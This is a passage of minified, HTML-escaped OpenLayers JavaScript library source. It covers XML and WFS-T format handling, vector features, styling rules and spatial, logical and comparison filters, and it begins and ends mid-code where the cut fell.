8:break;default:b=!0&#125;if(c&amp;&amp;b)break&#125;if(c&amp;&amp;b)d=OpenLayers.Format.XML.CONTENT_TYPE.MIXED;else&#123;if(c)return OpenLayers.Format.XML.CONTENT_TYPE.COMPLEX;if(b)return OpenLayers.Format.XML.CONTENT_TYPE.SIMPLE&#125;return d&#125;,hasAttributeNS:function(a,b,c)&#123;var d=!1;return d=a.hasAttributeNS?a.hasAttributeNS(b,c):!!this.getAttributeNodeNS(a,b,c)&#125;,setAttributeNS:function(a,b,c,d)&#123;if(a.setAttributeNS)a.setAttributeNS(b,c,d);else if(this.xmldom)b?(b=a.ownerDocument.createNode(2,c,b),b.nodeValue=d,a.setAttributeNode(b)):a.setAttribute(c,d);else throw"setAttributeNS not implemented";&#125;,createElementNSPlus:function(a,b)&#123;b=b||&#123;&#125;;var c=b.uri||this.namespaces[b.prefix];c||(c=a.indexOf(":"),c=this.namespaces[a.substring(0,c)]);c||(c=this.namespaces[this.defaultPrefix]);c=this.createElementNS(c,a);b.attributes&amp;&amp;this.setAttributes(c,b.attributes);var d=b.value;null!=d&amp;&amp;c.appendChild(this.createTextNode(d));return c&#125;,setAttributes:function(a,b)&#123;var c,d,e;for(e in b)null!=b[e]&amp;&amp;b[e].toString&amp;&amp;(c=b[e].toString(),d=this.namespaces[e.substring(0,e.indexOf(":"))]||null,this.setAttributeNS(a,d,e,c))&#125;,readNode:function(a,b)&#123;b||(b=&#123;&#125;);var c=this.readers[a.namespaceURI?this.namespaceAlias[a.namespaceURI]:this.defaultPrefix];if(c)&#123;var d=a.localName||a.nodeName.split(":").pop();(c=c[d]||c["*"])&amp;&amp;c.apply(this,[a,b])&#125;return b&#125;,readChildNodes:function(a,b)&#123;b||(b=&#123;&#125;);for(var c=a.childNodes,d,e=0,f=c.length;e&lt;f;++e)d=c[e],1==d.nodeType&amp;&amp;this.readNode(d,b);return b&#125;,writeNode:function(a,b,c)&#123;var d,e=a.indexOf(":");0&lt;e?(d=a.substring(0,e),a=a.substring(e+1)):d=c?this.namespaceAlias[c.namespaceURI]:this.defaultPrefix;b=this.writers[d][a].apply(this,[b]);c&amp;&amp;c.appendChild(b);return b&#125;,getChildEl:function(a,b,c)&#123;return a&amp;&amp;this.getThisOrNextEl(a.firstChild,b,c)&#125;,getNextEl:function(a,b,c)&#123;return a&amp;&amp;this.getThisOrNextEl(a.nextSibling,b,c)&#125;,getThisOrNextEl:function(a,b,c)&#123;a:for(;a;a=a.nextSibling)switch(a.nodeType)&#123;case 1:if(!(b&amp;&amp;b!==(a.localName||a.nodeName.split(":").pop())||c&amp;&amp;c!==a.namespaceURI))break a;a=null;break a;case 3:if(/^\s*$/.test(a.nodeValue))break;case 4:case 6:case 12:case 10:case 11:a=null;break a&#125;return a||null&#125;,lookupNamespaceURI:function(a,b)&#123;var c=null;if(a)if(a.lookupNamespaceURI)c=a.lookupNamespaceURI(b);else a:switch(a.nodeType)&#123;case 1:if(null!==a.namespaceURI&amp;&amp;a.prefix===b)&#123;c=a.namespaceURI;break a&#125;if(c=a.attributes.length)for(var d,e=0;e&lt;c;++e)if(d=a.attributes[e],"xmlns"===d.prefix&amp;&amp;d.name==="xmlns:"+b)&#123;c=d.value||null;break a&#125;else if("xmlns"===d.name&amp;&amp;null===b)&#123;c=d.value||null;break a&#125;c=this.lookupNamespaceURI(a.parentNode,b);break a;case 2:c=this.lookupNamespaceURI(a.ownerElement,b);break a;case 9:c=this.lookupNamespaceURI(a.documentElement,b);break a;case 6:case 12:case 10:case 11:break a;default:c=this.lookupNamespaceURI(a.parentNode,b)&#125;return c&#125;,getXMLDoc:function()&#123;OpenLayers.Format.XML.document||this.xmldom||(document.implementation&amp;&amp;document.implementation.createDocument?OpenLayers.Format.XML.document=document.implementation.createDocument("","",null):!this.xmldom&amp;&amp;window.ActiveXObject&amp;&amp;(this.xmldom=new ActiveXObject("Microsoft.XMLDOM")));return OpenLayers.Format.XML.document||this.xmldom&#125;,CLASS_NAME:"OpenLayers.Format.XML"&#125;);OpenLayers.Format.XML.CONTENT_TYPE=&#123;EMPTY:0,SIMPLE:1,COMPLEX:2,MIXED:3&#125;;OpenLayers.Format.XML.lookupNamespaceURI=OpenLayers.Function.bind(OpenLayers.Format.XML.prototype.lookupNamespaceURI,OpenLayers.Format.XML.prototype);OpenLayers.Format.XML.document=null;OpenLayers.Format.WFST=function(a)&#123;a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.WFST.DEFAULTS);var b=OpenLayers.Format.WFST["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported WFST version: "+a.version;return new b(a)&#125;;OpenLayers.Format.WFST.DEFAULTS=&#123;version:"1.0.0"&#125;;OpenLayers.Feature=OpenLayers.Class(&#123;layer:null,id:null,lonlat:null,data:null,marker:null,popupClass:null,popup:null,initialize:function(a,b,c)&#123;this.layer=a;this.lonlat=b;this.data=null!=c?c:&#123;&#125;;this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")&#125;,destroy:function()&#123;null!=this.layer&amp;&amp;null!=this.layer.map&amp;&amp;null!=this.popup&amp;&amp;this.layer.map.removePopup(this.popup);null!=this.layer&amp;&amp;null!=this.marker&amp;&amp;this.layer.removeMarker(this.marker);this.data=this.lonlat=this.id=this.layer=null;null!=this.marker&amp;&amp;(this.destroyMarker(this.marker),this.marker=null);null!=this.popup&amp;&amp;(this.destroyPopup(this.popup),this.popup=null)&#125;,onScreen:function()&#123;var a=!1;null!=this.layer&amp;&amp;null!=this.layer.map&amp;&amp;(a=this.layer.map.getExtent().containsLonLat(this.lonlat));return a&#125;,createMarker:function()&#123;null!=this.lonlat&amp;&amp;(this.marker=new OpenLayers.Marker(this.lonlat,this.data.icon));return this.marker&#125;,destroyMarker:function()&#123;this.marker.destroy()&#125;,createPopup:function(a)&#123;null!=this.lonlat&amp;&amp;(this.popup||(this.popup=new (this.popupClass?this.popupClass:OpenLayers.Popup.Anchored)(this.id+"_popup",this.lonlat,this.data.popupSize,this.data.popupContentHTML,this.marker?this.marker.icon:null,a)),null!=this.data.overflow&amp;&amp;(this.popup.contentDiv.style.overflow=this.data.overflow),this.popup.feature=this);return this.popup&#125;,destroyPopup:function()&#123;this.popup&amp;&amp;(this.popup.feature=null,this.popup.destroy(),this.popup=null)&#125;,CLASS_NAME:"OpenLayers.Feature"&#125;);OpenLayers.State=&#123;UNKNOWN:"Unknown",INSERT:"Insert",UPDATE:"Update",DELETE:"Delete"&#125;;OpenLayers.Feature.Vector=OpenLayers.Class(OpenLayers.Feature,&#123;fid:null,geometry:null,attributes:null,bounds:null,state:null,style:null,url:null,renderIntent:"default",modified:null,initialize:function(a,b,c)&#123;OpenLayers.Feature.prototype.initialize.apply(this,[null,null,b]);this.lonlat=null;this.geometry=a?a:null;this.state=null;this.attributes=&#123;&#125;;b&amp;&amp;(this.attributes=OpenLayers.Util.extend(this.attributes,b));this.style=c?c:null&#125;,destroy:function()&#123;this.layer&amp;&amp;(this.layer.removeFeatures(this),this.layer=null);this.modified=this.geometry=null;OpenLayers.Feature.prototype.destroy.apply(this,arguments)&#125;,clone:function()&#123;return new OpenLayers.Feature.Vector(this.geometry?this.geometry.clone():null,this.attributes,this.style)&#125;,onScreen:function(a)&#123;var b=!1;this.layer&amp;&amp;this.layer.map&amp;&amp;(b=this.layer.map.getExtent(),a?(a=this.geometry.getBounds(),b=b.intersectsBounds(a)):b=b.toGeometry().intersects(this.geometry));return b&#125;,getVisibility:function()&#123;return!(this.style&amp;&amp;"none"==this.style.display||!this.layer||this.layer&amp;&amp;this.layer.styleMap&amp;&amp;"none"==this.layer.styleMap.createSymbolizer(this,this.renderIntent).display||this.layer&amp;&amp;!this.layer.getVisibility())&#125;,createMarker:function()&#123;return null&#125;,destroyMarker:function()&#123;&#125;,createPopup:function()&#123;return null&#125;,atPoint:function(a,b,c)&#123;var d=!1;this.geometry&amp;&amp;(d=this.geometry.atPoint(a,b,c));return d&#125;,destroyPopup:function()&#123;&#125;,move:function(a)&#123;if(this.layer&amp;&amp;this.geometry.move)&#123;a="OpenLayers.LonLat"==a.CLASS_NAME?this.layer.getViewPortPxFromLonLat(a):a;var b=this.layer.getViewPortPxFromLonLat(this.geometry.getBounds().getCenterLonLat()),c=this.layer.map.getResolution();this.geometry.move(c*(a.x-b.x),c*(b.y-a.y));this.layer.drawFeature(this);return b&#125;&#125;,toState:function(a)&#123;if(a==OpenLayers.State.UPDATE)switch(this.state)&#123;case OpenLayers.State.UNKNOWN:case OpenLayers.State.DELETE:this.state=a&#125;else if(a==OpenLayers.State.INSERT)switch(this.state)&#123;case OpenLayers.State.UNKNOWN:break;default:this.state=a&#125;else if(a==OpenLayers.State.DELETE)switch(this.state)&#123;case OpenLayers.State.UNKNOWN:case OpenLayers.State.UPDATE:this.state=a&#125;else a==OpenLayers.State.UNKNOWN&amp;&amp;(this.state=a)&#125;,CLASS_NAME:"OpenLayers.Feature.Vector"&#125;);OpenLayers.Feature.Vector.style=&#123;"default":&#123;fillColor:"#ee9900",fillOpacity:0.4,hoverFillColor:"white",hoverFillOpacity:0.8,strokeColor:"#ee9900",strokeOpacity:1,strokeWidth:1,strokeLinecap:"round",strokeDashstyle:"solid",hoverStrokeColor:"red",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:"%",pointerEvents:"visiblePainted",cursor:"inherit",fontColor:"#000000",labelAlign:"cm",labelOutlineColor:"white",labelOutlineWidth:3&#125;,select:&#123;fillColor:"blue",fillOpacity:0.4,hoverFillColor:"white",hoverFillOpacity:0.8,strokeColor:"blue",strokeOpacity:1,strokeWidth:2,strokeLinecap:"round",strokeDashstyle:"solid",hoverStrokeColor:"red",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:"%",pointerEvents:"visiblePainted",cursor:"pointer",fontColor:"#000000",labelAlign:"cm",labelOutlineColor:"white",labelOutlineWidth:3&#125;,temporary:&#123;fillColor:"#66cccc",fillOpacity:0.2,hoverFillColor:"white",hoverFillOpacity:0.8,strokeColor:"#66cccc",strokeOpacity:1,strokeLinecap:"round",strokeWidth:2,strokeDashstyle:"solid",hoverStrokeColor:"red",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:"%",pointerEvents:"visiblePainted",cursor:"inherit",fontColor:"#000000",labelAlign:"cm",labelOutlineColor:"white",labelOutlineWidth:3&#125;,"delete":&#123;display:"none"&#125;&#125;;OpenLayers.Style=OpenLayers.Class(&#123;id:null,name:null,title:null,description:null,layerName:null,isDefault:!1,rules:null,context:null,defaultStyle:null,defaultsPerSymbolizer:!1,propertyStyles:null,initialize:function(a,b)&#123;OpenLayers.Util.extend(this,b);this.rules=[];b&amp;&amp;b.rules&amp;&amp;this.addRules(b.rules);this.setDefaultStyle(a||OpenLayers.Feature.Vector.style["default"]);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")&#125;,destroy:function()&#123;for(var a=0,b=this.rules.length;a&lt;b;a++)this.rules[a].destroy(),this.rules[a]=null;this.defaultStyle=this.rules=null&#125;,createSymbolizer:function(a)&#123;for(var b=this.defaultsPerSymbolizer?&#123;&#125;:this.createLiterals(OpenLayers.Util.extend(&#123;&#125;,this.defaultStyle),a),c=this.rules,d,e=[],f=!1,g=0,h=c.length;g&lt;h;g++)d=c[g],d.evaluate(a)&amp;&amp;(d instanceof OpenLayers.Rule&amp;&amp;d.elseFilter?e.push(d):(f=!0,this.applySymbolizer(d,b,a)));if(!1==f&amp;&amp;0&lt;e.length)for(f=!0,g=0,h=e.length;g&lt;h;g++)this.applySymbolizer(e[g],b,a);0&lt;c.length&amp;&amp;!1==f&amp;&amp;(b.display="none");null!=b.label&amp;&amp;"string"!==typeof b.label&amp;&amp;(b.label=String(b.label));return b&#125;,applySymbolizer:function(a,b,c)&#123;var d=c.geometry?this.getSymbolizerPrefix(c.geometry):OpenLayers.Style.SYMBOLIZER_PREFIXES[0];a=a.symbolizer[d]||a.symbolizer;!0===this.defaultsPerSymbolizer&amp;&amp;(d=this.defaultStyle,OpenLayers.Util.applyDefaults(a,&#123;pointRadius:d.pointRadius&#125;),!0!==a.stroke&amp;&amp;!0!==a.graphic||OpenLayers.Util.applyDefaults(a,&#123;strokeWidth:d.strokeWidth,strokeColor:d.strokeColor,strokeOpacity:d.strokeOpacity,strokeDashstyle:d.strokeDashstyle,strokeLinecap:d.strokeLinecap&#125;),!0!==a.fill&amp;&amp;!0!==a.graphic||OpenLayers.Util.applyDefaults(a,&#123;fillColor:d.fillColor,fillOpacity:d.fillOpacity&#125;),!0===a.graphic&amp;&amp;OpenLayers.Util.applyDefaults(a,&#123;pointRadius:this.defaultStyle.pointRadius,externalGraphic:this.defaultStyle.externalGraphic,graphicName:this.defaultStyle.graphicName,graphicOpacity:this.defaultStyle.graphicOpacity,graphicWidth:this.defaultStyle.graphicWidth,graphicHeight:this.defaultStyle.graphicHeight,graphicXOffset:this.defaultStyle.graphicXOffset,graphicYOffset:this.defaultStyle.graphicYOffset&#125;));return this.createLiterals(OpenLayers.Util.extend(b,a),c)&#125;,createLiterals:function(a,b)&#123;var c=OpenLayers.Util.extend(&#123;&#125;,b.attributes||b.data);OpenLayers.Util.extend(c,this.context);for(var d in this.propertyStyles)a[d]=OpenLayers.Style.createLiteral(a[d],c,b,d);return a&#125;,findPropertyStyles:function()&#123;var a=&#123;&#125;;this.addPropertyStyles(a,this.defaultStyle);for(var b=this.rules,c,d,e=0,f=b.length;e&lt;f;e++)&#123;c=b[e].symbolizer;for(var g in c)if(d=c[g],"object"==typeof d)this.addPropertyStyles(a,d);else&#123;this.addPropertyStyles(a,c);break&#125;&#125;return a&#125;,addPropertyStyles:function(a,b)&#123;var c,d;for(d in b)c=b[d],"string"==typeof c&amp;&amp;c.match(/\$\&#123;\w+\&#125;/)&amp;&amp;(a[d]=!0);return a&#125;,addRules:function(a)&#123;Array.prototype.push.apply(this.rules,a);this.propertyStyles=this.findPropertyStyles()&#125;,setDefaultStyle:function(a)&#123;this.defaultStyle=a;this.propertyStyles=this.findPropertyStyles()&#125;,getSymbolizerPrefix:function(a)&#123;for(var b=OpenLayers.Style.SYMBOLIZER_PREFIXES,c=0,d=b.length;c&lt;d;c++)if(-1!=a.CLASS_NAME.indexOf(b[c]))return b[c]&#125;,clone:function()&#123;var a=OpenLayers.Util.extend(&#123;&#125;,this);if(this.rules)&#123;a.rules=[];for(var b=0,c=this.rules.length;b&lt;c;++b)a.rules.push(this.rules[b].clone())&#125;a.context=this.context&amp;&amp;OpenLayers.Util.extend(&#123;&#125;,this.context);b=OpenLayers.Util.extend(&#123;&#125;,this.defaultStyle);return new OpenLayers.Style(b,a)&#125;,CLASS_NAME:"OpenLayers.Style"&#125;);OpenLayers.Style.createLiteral=function(a,b,c,d)&#123;"string"==typeof a&amp;&amp;-1!=a.indexOf("$&#123;")&amp;&amp;(a=OpenLayers.String.format(a,b,[c,d]),a=isNaN(a)||!a?a:parseFloat(a));return a&#125;;OpenLayers.Style.SYMBOLIZER_PREFIXES=["Point","Line","Polygon","Text","Raster"];OpenLayers.Filter=OpenLayers.Class(&#123;initialize:function(a)&#123;OpenLayers.Util.extend(this,a)&#125;,destroy:function()&#123;&#125;,evaluate:function(a)&#123;return!0&#125;,clone:function()&#123;return null&#125;,toString:function()&#123;return OpenLayers.Format&amp;&amp;OpenLayers.Format.CQL?OpenLayers.Format.CQL.prototype.write(this):Object.prototype.toString.call(this)&#125;,CLASS_NAME:"OpenLayers.Filter"&#125;);OpenLayers.Filter.Spatial=OpenLayers.Class(OpenLayers.Filter,&#123;type:null,property:null,value:null,distance:null,distanceUnits:null,evaluate:function(a)&#123;var b=!1;switch(this.type)&#123;case OpenLayers.Filter.Spatial.BBOX:case OpenLayers.Filter.Spatial.INTERSECTS:if(a.geometry)&#123;var c=this.value;"OpenLayers.Bounds"==this.value.CLASS_NAME&amp;&amp;(c=this.value.toGeometry());a.geometry.intersects(c)&amp;&amp;(b=!0)&#125;break;default:throw Error("evaluate is not implemented for this filter type.");&#125;return b&#125;,clone:function()&#123;var a=OpenLayers.Util.applyDefaults(&#123;value:this.value&amp;&amp;this.value.clone&amp;&amp;this.value.clone()&#125;,this);return new OpenLayers.Filter.Spatial(a)&#125;,CLASS_NAME:"OpenLayers.Filter.Spatial"&#125;);OpenLayers.Filter.Spatial.BBOX="BBOX";OpenLayers.Filter.Spatial.INTERSECTS="INTERSECTS";OpenLayers.Filter.Spatial.DWITHIN="DWITHIN";OpenLayers.Filter.Spatial.WITHIN="WITHIN";OpenLayers.Filter.Spatial.CONTAINS="CONTAINS";OpenLayers.Filter.FeatureId=OpenLayers.Class(OpenLayers.Filter,&#123;fids:null,type:"FID",initialize:function(a)&#123;this.fids=[];OpenLayers.Filter.prototype.initialize.apply(this,[a])&#125;,evaluate:function(a)&#123;for(var b=0,c=this.fids.length;b&lt;c;b++)if((a.fid||a.id)==this.fids[b])return!0;return!1&#125;,clone:function()&#123;var a=new OpenLayers.Filter.FeatureId;OpenLayers.Util.extend(a,this);a.fids=this.fids.slice();return a&#125;,CLASS_NAME:"OpenLayers.Filter.FeatureId"&#125;);OpenLayers.Format.WFST.v1=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",wfs:"http://www.opengis.net/wfs",gml:"http://www.opengis.net/gml",ogc:"http://www.opengis.net/ogc",ows:"http://www.opengis.net/ows"&#125;,defaultPrefix:"wfs",version:null,schemaLocations:null,srsName:null,extractAttributes:!0,xy:!0,stateName:null,initialize:function(a)&#123;this.stateName=&#123;&#125;;this.stateName[OpenLayers.State.INSERT]="wfs:Insert";this.stateName[OpenLayers.State.UPDATE]="wfs:Update";this.stateName[OpenLayers.State.DELETE]="wfs:Delete";OpenLayers.Format.XML.prototype.initialize.apply(this,[a])&#125;,getSrsName:function(a,b)&#123;var c=b&amp;&amp;b.srsName;c||(c=a&amp;&amp;a.layer?a.layer.projection.getCode():this.srsName);return c&#125;,read:function(a,b)&#123;b=b||&#123;&#125;;OpenLayers.Util.applyDefaults(b,&#123;output:"features"&#125;);"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var c=&#123;&#125;;a&amp;&amp;this.readNode(a,c,!0);c.features&amp;&amp;"features"===b.output&amp;&amp;(c=c.features);return c&#125;,readers:&#123;wfs:&#123;FeatureCollection:function(a,b)&#123;b.features=[];this.readChildNodes(a,b)&#125;&#125;&#125;,write:function(a,b)&#123;var c=this.writeNode("wfs:Transaction",&#123;features:a,options:b&#125;),d=this.schemaLocationAttr();d&amp;&amp;this.setAttributeNS(c,this.namespaces.xsi,"xsi:schemaLocation",d);return OpenLayers.Format.XML.prototype.write.apply(this,[c])&#125;,writers:&#123;wfs:&#123;GetFeature:function(a)&#123;var b=this.createElementNSPlus("wfs:GetFeature",&#123;attributes:&#123;service:"WFS",version:this.version,handle:a&amp;&amp;a.handle,outputFormat:a&amp;&amp;a.outputFormat,maxFeatures:a&amp;&amp;a.maxFeatures,"xsi:schemaLocation":this.schemaLocationAttr(a)&#125;&#125;);if("string"==typeof this.featureType)this.writeNode("Query",a,b);else for(var c=0,d=this.featureType.length;c&lt;d;c++)a.featureType=this.featureType[c],this.writeNode("Query",a,b);return b&#125;,Transaction:function(a)&#123;a=a||&#123;&#125;;var b=a.options||&#123;&#125;,c=this.createElementNSPlus("wfs:Transaction",&#123;attributes:&#123;service:"WFS",version:this.version,handle:b.handle&#125;&#125;),d,e=a.features;if(e)&#123;!0===b.multi&amp;&amp;OpenLayers.Util.extend(this.geometryTypes,&#123;"OpenLayers.Geometry.Point":"MultiPoint","OpenLayers.Geometry.LineString":!0===this.multiCurve?"MultiCurve":"MultiLineString","OpenLayers.Geometry.Polygon":!0===this.multiSurface?"MultiSurface":"MultiPolygon"&#125;);var f,g;a=0;for(d=e.length;a&lt;d;++a)g=e[a],(f=this.stateName[g.state])&amp;&amp;this.writeNode(f,&#123;feature:g,options:b&#125;,c);!0===b.multi&amp;&amp;this.setGeometryTypes()&#125;if(b.nativeElements)for(a=0,d=b.nativeElements.length;a&lt;d;++a)this.writeNode("wfs:Native",b.nativeElements[a],c);return c&#125;,Native:function(a)&#123;return this.createElementNSPlus("wfs:Native",&#123;attributes:&#123;vendorId:a.vendorId,safeToIgnore:a.safeToIgnore&#125;,value:a.value&#125;)&#125;,Insert:function(a)&#123;var b=a.feature;a=a.options;a=this.createElementNSPlus("wfs:Insert",&#123;attributes:&#123;handle:a&amp;&amp;a.handle&#125;&#125;);this.srsName=this.getSrsName(b);this.writeNode("feature:_typeName",b,a);return a&#125;,Update:function(a)&#123;var b=a.feature;a=a.options;a=this.createElementNSPlus("wfs:Update",&#123;attributes:&#123;handle:a&amp;&amp;a.handle,typeName:(this.featureNS?this.featurePrefix+":":"")+this.featureType&#125;&#125;);this.featureNS&amp;&amp;a.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);var c=b.modified;null===this.geometryName||c&amp;&amp;void 0===c.geometry||(this.srsName=this.getSrsName(b),this.writeNode("Property",&#123;name:this.geometryName,value:b.geometry&#125;,a));for(var d in b.attributes)void 0===b.attributes[d]||c&amp;&amp;c.attributes&amp;&amp;(!c.attributes||void 0===c.attributes[d])||this.writeNode("Property",&#123;name:d,value:b.attributes[d]&#125;,a);this.writeNode("ogc:Filter",new OpenLayers.Filter.FeatureId(&#123;fids:[b.fid]&#125;),a);return a&#125;,Property:function(a)&#123;var b=this.createElementNSPlus("wfs:Property");this.writeNode("Name",a.name,b);null!==a.value&amp;&amp;this.writeNode("Value",a.value,b);return b&#125;,Name:function(a)&#123;return this.createElementNSPlus("wfs:Name",&#123;value:a&#125;)&#125;,Value:function(a)&#123;var b;a instanceof OpenLayers.Geometry?(b=this.createElementNSPlus("wfs:Value"),a=this.writeNode("feature:_geometry",a).firstChild,b.appendChild(a)):b=this.createElementNSPlus("wfs:Value",&#123;value:a&#125;);return b&#125;,Delete:function(a)&#123;var b=a.feature;a=a.options;a=this.createElementNSPlus("wfs:Delete",&#123;attributes:&#123;handle:a&amp;&amp;a.handle,typeName:(this.featureNS?this.featurePrefix+":":"")+this.featureType&#125;&#125;);this.featureNS&amp;&amp;a.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);this.writeNode("ogc:Filter",new OpenLayers.Filter.FeatureId(&#123;fids:[b.fid]&#125;),a);return a&#125;&#125;&#125;,schemaLocationAttr:function(a)&#123;a=OpenLayers.Util.extend(&#123;featurePrefix:this.featurePrefix,schema:this.schema&#125;,a);var b=OpenLayers.Util.extend(&#123;&#125;,this.schemaLocations);a.schema&amp;&amp;(b[a.featurePrefix]=a.schema);a=[];var c,d;for(d in b)(c=this.namespaces[d])&amp;&amp;a.push(c+" "+b[d]);return a.join(" ")||void 0&#125;,setFilterProperty:function(a)&#123;if(a.filters)for(var b=0,c=a.filters.length;b&lt;c;++b)OpenLayers.Format.WFST.v1.prototype.setFilterProperty.call(this,a.filters[b]);else a instanceof OpenLayers.Filter.Spatial&amp;&amp;!a.property&amp;&amp;(a.property=this.geometryName)&#125;,CLASS_NAME:"OpenLayers.Format.WFST.v1"&#125;);OpenLayers.Format.OGCExceptionReport=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;ogc:"http://www.opengis.net/ogc"&#125;,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,defaultPrefix:"ogc",read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=&#123;exceptionReport:null&#125;;a.documentElement&amp;&amp;(this.readChildNodes(a,b),null===b.exceptionReport&amp;&amp;(b=(new OpenLayers.Format.OWSCommon).read(a)));return b&#125;,readers:&#123;ogc:&#123;ServiceExceptionReport:function(a,b)&#123;b.exceptionReport=&#123;exceptions:[]&#125;;this.readChildNodes(a,b.exceptionReport)&#125;,ServiceException:function(a,b)&#123;var c=&#123;code:a.getAttribute("code"),locator:a.getAttribute("locator"),text:this.getChildValue(a)&#125;;b.exceptions.push(c)&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.OGCExceptionReport"&#125;);OpenLayers.Format.XML.VersionedOGC=OpenLayers.Class(OpenLayers.Format.XML,&#123;defaultVersion:null,version:null,profile:null,allowFallback:!1,name:null,stringifyOutput:!1,parser:null,initialize:function(a)&#123;OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);a=this.CLASS_NAME;this.name=a.substring(a.lastIndexOf(".")+1)&#125;,getVersion:function(a,b)&#123;var c;a?(c=this.version,c||(c=a.getAttribute("version"),c||(c=this.defaultVersion))):c=b&amp;&amp;b.version||this.version||this.defaultVersion;return c&#125;,getParser:function(a)&#123;a=a||this.defaultVersion;var b=this.profile?"_"+this.profile:"";if(!this.parser||this.parser.VERSION!=a)&#123;var c=OpenLayers.Format[this.name]["v"+a.replace(/\./g,"_")+b];if(!c&amp;&amp;(""!==b&amp;&amp;this.allowFallback&amp;&amp;(b="",c=OpenLayers.Format[this.name]["v"+a.replace(/\./g,"_")]),!c))throw"Can't find a "+this.name+" parser for version "+a+b;this.parser=new c(this.options)&#125;return this.parser&#125;,write:function(a,b)&#123;var c=this.getVersion(null,b);this.parser=this.getParser(c);c=this.parser.write(a,b);return!1===this.stringifyOutput?c:OpenLayers.Format.XML.prototype.write.apply(this,[c])&#125;,read:function(a,b)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var c=this.getVersion(a.documentElement);this.parser=this.getParser(c);var d=this.parser.read(a,b),e=this.parser.errorProperty||null;null!==e&amp;&amp;void 0===d[e]&amp;&amp;(e=new OpenLayers.Format.OGCExceptionReport,d.error=e.read(a));d.version=c;return d&#125;,CLASS_NAME:"OpenLayers.Format.XML.VersionedOGC"&#125;);OpenLayers.Filter.Logical=OpenLayers.Class(OpenLayers.Filter,&#123;filters:null,type:null,initialize:function(a)&#123;this.filters=[];OpenLayers.Filter.prototype.initialize.apply(this,[a])&#125;,destroy:function()&#123;this.filters=null;OpenLayers.Filter.prototype.destroy.apply(this)&#125;,evaluate:function(a)&#123;var b,c;switch(this.type)&#123;case OpenLayers.Filter.Logical.AND:b=0;for(c=this.filters.length;b&lt;c;b++)if(!1==this.filters[b].evaluate(a))return!1;return!0;case OpenLayers.Filter.Logical.OR:b=0;for(c=this.filters.length;b&lt;c;b++)if(!0==this.filters[b].evaluate(a))return!0;return!1;case OpenLayers.Filter.Logical.NOT:return!this.filters[0].evaluate(a)&#125;&#125;,clone:function()&#123;for(var a=[],b=0,c=this.filters.length;b&lt;c;++b)a.push(this.filters[b].clone());return new OpenLayers.Filter.Logical(&#123;type:this.type,filters:a&#125;)&#125;,CLASS_NAME:"OpenLayers.Filter.Logical"&#125;);OpenLayers.Filter.Logical.AND="&amp;&amp;";OpenLayers.Filter.Logical.OR="||";OpenLayers.Filter.Logical.NOT="!";OpenLayers.Filter.Comparison=OpenLayers.Class(OpenLayers.Filter,&#123;type:null,property:null,value:null,matchCase:!0,lowerBoundary:null,upperBoundary:null,initialize:function(a)&#123;OpenLayers.Filter.prototype.initialize.apply(this,[a]);this.type===OpenLayers.Filter.Comparison.LIKE&amp;&amp;void 0===a.matchCase&amp;&amp;(this.matchCase=null)&#125;,evaluate:function(a)&#123;a instanceof OpenLayers.Feature.Vector&amp;&amp;(a=a.attributes);var b=!1;a=a[this.property];switch(this.type)&#123;case OpenLayers.Filter.Comparison.EQUAL_TO:b=this.value;b=this.matchCase||"string"!=typeof a||"string"!=typeof b?a==b:a.toUpperCase()==b.toUpperCase();break;case OpenLayers.Filter.Comparison.NOT_EQUAL_TO:b=this.value;b=this.matchCase||"string"!=typeof a||"string"!=typeof b?a!=b:a.toUpperCase()!=b.toUpperCase();break;case OpenLayers.Filter.Comparison.LESS_THAN:b=a&lt;this.value;break;case OpenLayers.Filter.Comparison.GREATER_THAN:b=a&gt;this.value;break;case OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO:b=a&lt;=this.value;break;case OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO:b=a&gt;=this.value;break;case OpenLayers.Filter.Comparison.BETWEEN:b=a&gt;=this.lowerBoundary&amp;&amp;a&lt;=this.upperBoundary;break;case OpenLayers.Filter.Comparison.LIKE:b=RegExp(this.value,"gi").test(a);break;case OpenLayers.Filter.Comparison.IS_NULL:b=null===a&#125;return b&#125;,value2regex:function(a,b,c)&#123;if("."==a)throw Error("'.' is an unsupported wildCard character for OpenLayers.Filter.Comparison");a=a?a:"*";b=b?b:".";this.value=this.value.replace(RegExp("\\"+(c?c:"!")+"(.|$)","g"),"\\$1");this.value=this.value.replace(RegExp("\\"+b,"g"),".");this.value=this.value.replace(RegExp("\\"+a,"g"),".*");this.value=this.value.replace(RegExp("\\\\.\\*","g"),"\\"+a);return this.value=this.value.replace(RegExp("\\\\\\.","g"),"\\"+b)&#125;,regex2value:function()&#123;var a=this.value,a=a.replace(/!/g,"!!"),a=a.replace(/(\\)?\\\./g,function(a,c)&#123;return c?a:"!."&#125;),a=a.replace(/(\\)?\\\*/g,function(a,c)&#123;return c?a:"!*"&#125;),a=a.replace(/\\\\/g,"\\");return a=a.replace(/\.\*/g,"*")&#125;,clone:function()&#123;return OpenLayers.Util.extend(new 